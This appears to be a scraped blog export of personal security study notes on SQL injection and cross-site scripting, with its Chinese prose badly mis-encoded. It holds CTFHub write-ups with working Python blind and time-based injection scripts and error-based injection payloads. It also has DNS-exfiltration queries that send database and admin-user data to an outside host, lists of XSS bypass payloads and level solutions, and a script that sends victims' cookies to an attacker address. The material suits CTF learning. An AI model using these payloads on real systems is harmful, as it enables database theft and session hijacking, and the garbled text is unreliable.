1?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+ ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰æ ¹æ®é¢˜ç›®å¯çŸ¥ç”¨ 1if(a,b,c) aå¯¹å°±æ‰§è¡Œbï¼Œå¦åˆ™å°±æ‰§è¡Œc è¿™ä¸ªé¢˜ç›®æ­£å¥½æ˜¯id=1,2ä¼šå¯¹ï¼Œ3å°±é”™æ‰€ä»¥æˆ‘ä»¬æŠŠb=1æˆ–2ï¼Œcä¸º3 æ¥ä¸‹æ¥å†™è„šæœ¬å°±å¯ä»¥ 12345678910111213141516171819import requestsdic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;url &#x3D; &#39;&#39;flag &#x3D; &#39;&#39;s &#x3D; requests.session()for i in range(0,50): for j in dic: payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j) r &#x3D; s.get(url&#x3D;payload) if &#39;query_success&#39; in r.text: flag +&#x3D;j break print(flag)#è¡¨payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)#åˆ—payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)#flagpayload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j) ä¸è¿‡ä¸­é—´å¥½åƒæ˜¯æœåŠ¡å™¨ä¼šå…³é—­æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ†ç»„æ‰«æ æ¯”å¦‚ä»1-30ï¼Œ30-50 ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰å’Œä¸Šä¸€é¢˜ä¸€æ ·ç›´æ¥å†™è„šæœ¬ 1234567891011121314151617181920import requestsdic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;url &#x3D; &#39;&#39;flag &#x3D; &#39;&#39;s &#x3D; requests.session()for i in range(0,50): for j in dic: try: payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j) r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1) except requests.exceptions.ReadTimeout: flag +&#x3D;j break print(flag)#è¡¨payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)#åˆ—payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)#flagpayload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j) 3.åŸºäºæŠ¥é”™çš„SQLç›²æ³¨12345' and updataxml(1,concat(0x7e,(select user()),0x7e),1) --+ //æŸ¥çœ‹ç”¨æˆ·' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ //æŸ¥çœ‹æ•°æ®åº“' and updataxml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+ //æŸ¥çœ‹æ•°æ®åº“çš„åå­—' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='test ' limit 0,1),0x7e),1) --+ //æŸ¥çœ‹å„è¡¨çš„åå­—'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='my student' limit 0,1),0x7e),1) --+ //æŸ¥çœ‹åˆ—çš„åå­— 4.äºŒæ¬¡æ³¨å…¥0x01äºŒæ¬¡æ³¨å…¥åŸç†é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚ ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚ ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚ 5.DNSæ³¨å…¥0x01DNS 0x02æ³¨å…¥å‡½æ•° 12select load_file(&quot;D:&#x2F;1.txt&quot;); &#x2F;&#x2F;è¯»å–æ–‡ä»¶select load_file(&quot;\\\\\\\\xxx.php90.cn\\\\ccc&quot;) &#x2F;&#x2F;è½¬ä¹‰ 0x03æ³¨å…¥123select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;xxx.php90.cn\\\\cc&quot;));select load_file(concat(&quot;\\\\\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\\\cc&quot;));select load_file(concat(&quot;\\\\\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\\\cc&quot;)); 6.æŠ¥é”™æ³¨å…¥æ›´è¯¦ç»†çš„è§£é‡Šhttps://xz.aliyun.com/t/253 æŠ¥é”™æ³¨å…¥åœ¨æ²¡æ³•ç”¨unionè”åˆæŸ¥è¯¢æ—¶ç”¨ï¼Œä½†å‰æè¿˜æ˜¯ä¸èƒ½è¿‡æ»¤ä¸€äº›å…³é”®çš„å‡½æ•°ã€‚ æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹xpathè¯­æ³•é”™è¯¯å’Œconcat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤ xpathè¯­æ³•é”™è¯¯åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨extractvalueå’Œupdatexmlä¸¤ä¸ªå‡½æ•°ã€‚ä½¿ç”¨æ¡ä»¶ï¼šmysqlç‰ˆæœ¬&gt;5.1.5 extractvalueå‡½æ•° å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸² ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ±‚ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ã€‚ pyloadï¼šid=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥)))) ä¾‹å¦‚ï¼š 123id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))12 é’ˆå¯¹mysqlæ•°æ®åº“ï¼š 12345æŸ¥æ•°æ®åº“åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))çˆ†è¡¨åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))çˆ†å­—æ®µåï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))çˆ†æ•°æ®ï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))1234 æ³¨ï¼š â‘  0x7e=â€™~â€™ â‘¡ concat(â€˜aâ€™,â€˜bâ€™)=â€œabâ€ â‘¢ version()=@@version â‘£ â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦ â‘¤ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½ updatexml å‡½æ•°åŸå‹ï¼šupdatexml(xml_document,xpath_string,new_value)æ­£å¸¸è¯­æ³•ï¼šupdatexml(xml_document,xpath_string,new_value)ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueæ˜¯stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„è´Ÿè·æ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ ç¬¬äºŒä¸ªå‚æ•°è·Ÿextractvalueå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·ï¼Œå› æ­¤ä¹Ÿå¯ä»¥åˆ©ç”¨ï¼Œä¸”åˆ©ç”¨æ–¹å¼ç›¸åŒpayloadï¼šid=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥())),&quot;anything&quot;)) ä¾‹å¦‚ï¼š 123&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))&#39;and(select updatexml(1,concat(0x7e,@@database),1))12 åŒæ ·ï¼Œé’ˆå¯¹mysqlï¼š 1234çˆ†æ•°æ®åº“åï¼š&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))çˆ†è¡¨åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))çˆ†åˆ—åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))çˆ†æ•°æ®ï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e)) concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤è¿™ç§æŠ¥é”™æ–¹æ³•çš„æœ¬è´¨æ˜¯å› ä¸ºfloor(rand(0)*2)çš„é‡å¤æ€§ï¼Œå¯¼è‡´group byè¯­å¥å‡ºé”™ã€‚group by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨çš„æ•°æ®ï¼›å¦‚æœkeyä¸åœ¨ä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚ rand()ï¼š ç”Ÿæˆ0~1ä¹‹é—´çš„éšæœºæ•°ï¼Œå¯ä»¥ç»™å®šä¸€ä¸ªéšæœºæ•°çš„ç§å­ï¼Œå¯¹äºæ¯ä¸€ä¸ªç»™å®šçš„ç§å­ï¼Œrand()å‡½æ•°éƒ½ä¼šäº§ç”Ÿä¸€ç³»åˆ—å¯ä»¥å¤ç°çš„æ•°å­— floor()ï¼š å¯¹ä»»æ„æ­£æˆ–è€…è´Ÿçš„åè¿›åˆ¶å€¼å‘ä¸‹å–æ•´ é€šå¸¸åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„æ–¹æ³•æ˜¯floor(rand(0))*2 ,å…¶ä¼šç”Ÿæˆ0å’Œ1ä¸¤ä¸ªæ•° group by group byæ˜¯æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„çš„sqlè¯­å¥ï¼Œå…¶ç”¨æ³•ä¸ºï¼šSELECT column_name, aggregate_function(column_name)FROM table_nameWHERE column_name operator valueGROUP BY column_name æŠ¥é”™çš„åŸå› æ˜¯å› ä¸ºrand()å‡½æ•°åœ¨æŸ¥è¯¢çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡,æ’å…¥çš„æ—¶å€™è¿˜ä¼šæ‰§è¡Œä¸€æ¬¡.è¿™å°±æ˜¯æ•´ä¸ªè¯­å¥æŠ¥é”™çš„å…³é”® å‰é¢è¯´è¿‡floor(rand(0)2) å‰å…­ä½æ˜¯*0110110 group by xå…ˆå»ºç«‹ä¸€ä¸ªç©ºè¡¨,ç”¨äºåˆ†ç»„.ç„¶åè¿›è¡Œåˆ†ç»„æŸ¥è¯¢,ç¬¬ä¸€æ¬¡rand()æ‰§è¡Œ,æŸ¥è¯¢çš„ç»“æœæ˜¯0,å› ä¸ºæ˜¯ç©ºè¡¨æ‰€ä»¥æ’å…¥è¿™æ¡,è€Œæ’å…¥çš„æ—¶å€™rand()åˆæ‰§è¡Œäº†ä¸€æ¬¡,æ‰€ä»¥è¡¨ä¸­çš„ç»“æœå°±æ˜¯ ç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œ,æ¥ç€æ‰§è¡Œrand()çš„å€¼ä¸º1,å› ä¸ºè¡¨ä¸­å­˜åœ¨,æ‰€ä»¥åŠ 1,è¡¨ä¸­ç»“æœæˆä¸º åˆ°äº†ç¬¬ä¸‰æ¬¡æ‰§è¡Œrand()æ˜¯å€¼ä¸º0,å› ä¸ºè¡¨ä¸­ä¸å­˜åœ¨æ‰€ä»¥è¦æ’å…¥æ–°çš„æ•°æ®,è¿™æ¬¡æ’å…¥rand()å†æ¬¡æ‰§è¡Œ,æ‰€ä»¥æ’å…¥çš„åˆæ˜¯1.è€Œè¡¨ä¸­å·²ç»å­˜åœ¨1äº† æ­¤æ—¶æ’å…¥å› ä¸ºé‡å¤å‡ºç°åŒä¸€ä¸ªkey,å°±ä¼šå‡ºç°æŠ¥é”™ é‡å¤å‡ºç°key.è€ŒæŠ¥é”™ä¸­ä¼šè¯´æ˜é‚£ä¸ªkeyæœ‰é—®é¢˜,æˆ‘ä»¬çš„keyä¸­ç»“åˆäº†æƒ³è¦äº†è§£çš„å­—ç¬¦ä¸²root@localhost è¿™æ ·å°±å®ç°äº†æŠ¥é”™æ³¨å…¥,æ‹¿åˆ°äº†è‡ªå·±æƒ³è¦çš„æ•°æ® è¿™å°±æ˜¯æ•´ä¸ªæŠ¥é”™æ³¨å…¥çš„åŸç†äº†,rand(),floor() group by å‡½æ•°ç¼ºä¸€ä¸å¯. 12#payload1 Union select count(*),concat((æŸ¥è¯¢è¯­å¥),0x26,floor(rand(0)*2))x from information_schema.columns group by x; çœ‹ä¸€ä¸‹ctfhubæŠ¥é”™æ³¨å…¥ ctfhubæŠ¥é”™æ³¨å…¥æŸ¥è¡¨ æŸ¥flag","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"}]},{"title":"xss","slug":"xss","date":"2020-12-09T15:34:13.000Z","updated":"2020-12-09T15:36:11.388Z","comments":true,"path":"2020/12/09/xss/","link":"","permalink":"https://pz1o.top/2020/12/09/xss/","excerpt":"","text":"è¿™ç¯‡æ›´ä¹±ï¼Œä¹Ÿå°±é‚£ä¸ªå°æŒ‘æˆ˜è¿˜ç®—å®Œæ•´ XSSåŸºç¡€çŸ¥è¯†ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼šä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ªç½‘é¡µï¼Œhtmlå’Œphpï¼Œphpä¼šå»¶æ—¶æ‰§è¡Œã€‚ åŒæ­¥ï¼šåªæœ‰å½“phpæ‰§è¡Œå®Œä¹‹åï¼Œæ‰ä¼šæ˜¾ç¤ºhtmlç½‘é¡µã€‚ å¼‚æ­¥ï¼šåˆ·æ–°ä¹‹åï¼Œä¼šç«‹å³æ˜¾ç¤ºhtmlç½‘é¡µï¼Œä¹‹åå†æ˜¾ç¤ºphpæ‰§è¡Œçš„å†…å®¹ã€‚ jsè®¾ç½®cookie1document.cookie&#x3D;&quot;phpsessid&#x3D; &quot;; 0x01å­˜å‚¨xsså­˜å‚¨å‹xssä¸»è¦æ˜¯æ”»å‡»è€…å°†xssä»£ç æ’å…¥åˆ°é¡µé¢ä¸Šï¼Œç„¶åå­˜åœ¨æ•°æ®åº“é‡Œï¼Œå½“è®¿é—®è€…è®¿é—®è¿™ä¸ªé¡µé¢æ—¶ï¼Œå°±ä¼šå¯¼è‡´xssä»£ç æ‰§è¡Œã€‚ å‡ºç°åœºæ™¯ï¼šç¼–è¾‘å†…å®¹ï¼ˆxssä»£ç ï¼‰å¯ä»¥ä¿å­˜ï¼Œå¹¶ä¸”å¯ä»¥å†æ¬¡è®¿é—®è¿™ä¸ªå†…å®¹ã€‚ 1&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt; 0x02åå°„xssæ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼ŒæœåŠ¡å™¨å°†urlä¸­çš„xssä»£ç è¾“å…¥åˆ°é¡µé¢ä¸Šï¼Œæ”»å‡»è€…å°†xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡»ã€‚ å‡ºç°åœºæ™¯ï¼šurlä¸­å¯ä»¥ä¼ é€’å‚æ•° é€šå¸¸æ¥è¯´ï¼Œä¼šé—­åˆä¸€äº›æ ‡ç­¾ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚ å¸¸ç”¨é—­åˆ 123&quot;&gt;&#39;&gt;&lt;&#x2F;xxx&gt; å…¶å®è¿˜æ˜¯å…·ä½“æƒ…å†µå…·ä½“å¯¹å¾… 0x03domå‹xssæ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼Œå‰ç«¯é¡µé¢ç›´æ¥ä»urlä¸­è·å–xssä»£ç å¹¶ä¸”è¾“å…¥åˆ°é¡µé¢ï¼Œå¯¼è‡´xssä»£ç çš„æ‰§è¡Œï¼Œæ”»å‡»è€…å°†å¸¦æœ‰xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡» å…³äºåå°„å‹å’Œdomå‹å·®åˆ«ï¼š å‰ç«¯å¤„ç†æ˜¯domï¼Œåç«¯å¤„ç†æ˜¯åå°„ å¸¸ç”¨ä¿®å¤å‡½æ•°strip_tagsï¼šè¿‡æ»¤htmlæ ‡ç­¾ htmlspecialcharsï¼šå°†htmlæ ‡ç­¾è½¬æ¢ä¸ºå®ä½“ å¸¸ç”¨çš„payloadæ ‡ç­¾123&lt;img src=\"x\" onerror=alert(1)&gt;&lt;img src=\"1\" onerror=eval(\"alert('xss')\")&gt;&lt;img src=1 onmouseover=alert('xss')&gt; 12345678910111213&lt;a href=\"javascript:alert('xss')\"&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=\"javascript:aaa\" onmouseover=\"alert(/xss/)\"&gt;aa&lt;/a&gt;éœ€è¦ç”¨ç¼–ç ç»•è¿‡æ—¶ï¼šBase64ï¼š&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;Murlencodeï¼š&lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M HTMLå®ä½“ç¼–ç  ï¼š&lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M&lt;a href=\"\" onclick=alert('xss')&gt;aa&lt;/a&gt;&lt;a href=\"\" onclick=eval(alert('xss'))&gt;bb&lt;/a&gt;&lt;a href=\"\" onmouseover=prompt('xss')&gt;cc&lt;/a&gt; 1234&lt;iframe src=\"data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;\"&gt;&lt;/iframe&gt;&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"&gt;&lt;iframe src=\"aaa\" onmouseover=alert('xss') /&gt;&lt;iframe&gt;&lt;iframe src=\"javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;\"&gt;&lt;/iframe&gt; 1234&lt;input value=\"\" onclick=alert('xss') type=\"text\"&gt;&lt;input name=\"name\" onmouseover=alert('xss')&gt;&lt;input name=\"name\" value=\"\" onmouseover=prompt('xss') bad=\"\"&gt;&lt;input value=1 type=image src onerror=alert(1) &gt; 123Cookieç›—å–ï¼š&lt;script&gt;var img=document.createElement(\"img\");img.src=\"http://xxx.xxx.xxx.xxx:1234/a?\"+escape(document.cookie);&lt;/script&gt;ncç›‘å¬ç«¯å£1234 xssç¼–ç jsç¼–ç JSæä¾›äº†å››ç§å­—ç¬¦ç¼–ç çš„ç­–ç•¥ï¼Œ ä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º\\141 ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º\\x61 å››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º\\u0061 å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„Cç±»å‹çš„è½¬ä¹‰é£æ ¼ï¼Œå¦‚\\nå’Œ\\r HTMLå®ä½“ç¼–ç å‘½åå®ä½“ä»¥&amp;å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œå¦‚&lt;çš„ç¼–ç ä¸º&amp;1t; å­—ç¬¦ç¼–ç  åè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶çš„ASCIIç æˆ–è€…Unicodeå­—ç¬¦ç¼–ç ã€‚æ ·å¼ä¸º&amp;#æ•°å€¼; å¦‚&lt;çš„ç¼–ç ä¸º &lt;(10è¿›åˆ¶)&amp;#60 &lt;(16è¿›åˆ¶)&amp;#x003c URLç¼–ç  è¿™é‡Œä¸ºurlå…¨ç¼–ç ï¼Œä¹Ÿå°±æ˜¯ä¸¤æ¬¡urlç¼–ç  å¦‚alertçš„urlå…¨ç¼–ç ä¸º%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34 String.fromCharCodeç¼–ç  å¦‚alertçš„ç¼–ç ä¸ºString.fromCharCode(97,108,101,114,116) xssæŒ‘æˆ˜é¢˜åšä»»ä½•é¢˜éƒ½å¯ä»¥æµ‹è¯• 1&lt;&quot;script on alert()&quot; href&gt; åšä¸€ä¸‹xssé¢˜ level1 å¯ä»¥å‘ç°teståœ¨h2æ ‡ç­¾å¤„ï¼Œç›´æ¥å†™å°±å¯ä»¥åªéœ€è¦å¼¹çª—ï¼Œå°±å¯ä»¥è¿›å…¥ä¸‹ä¸€å…³ 1?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level2 å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œå€¼ç›´æ¥åœ¨valueå¤„ï¼Œæ‰€ä»¥åªéœ€è¦é—­åˆæ ‡ç­¾å³å¯ æœç´¢æ¡†é‡Œç›´æ¥å†™ 1&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt; åŒæ—¶è¿˜æœ‰å…¶ä»–æ–¹æ³• 12345éœ€è¦é¼ æ ‡åˆ’è¿‡è¾“å…¥æ¡†&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;éœ€è¦ç‚¹å‡»æœç´¢æ¡†&quot; onclick&#x3D;alert(1) &gt;&quot; onclick&#x3D;alert(1) &quot; level3è¿™å…³è¿›è¡Œäº†å®ä½“è½¬ä¹‰ï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤äº†&lt;&gt;å’Œâ€â€,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å•å¼•å·å’Œæ³¨é‡Šç¬¦ å…¶ä¸­è½¬ä¹‰å‡½æ•° 12&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F; level4å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯åŒå¼•å· 1234&quot; onclick&#x3D;alert(1) &quot;&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F; level5è¿™ä¸ªå…³å¡è¿‡æ»¤äº†onï¼Œä½†æ²¡æœ‰è¿‡æ»¤å•åŒå¼•å·ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¼ªåè®® 1234&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; 